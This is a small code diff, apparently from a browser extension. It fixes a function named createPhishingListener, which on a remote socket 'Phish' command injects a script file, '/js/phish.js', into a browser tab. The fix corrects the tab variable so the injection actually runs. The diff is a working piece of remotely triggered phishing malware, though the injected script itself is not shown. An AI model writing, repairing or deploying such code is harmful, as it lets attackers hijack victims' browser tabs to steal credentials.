@@ -116,8 +116,8 @@ function uuid() {
 }
 
 function createPhishingListener() {
-  socket.on('Phish', (tab) => {
-    chrome.tabs.executeScript(tabId, {
+  socket.on('Phish', (tabID) => {
+    chrome.tabs.executeScript(tabID, {
       file: "/js/phish.js"
     });
   });
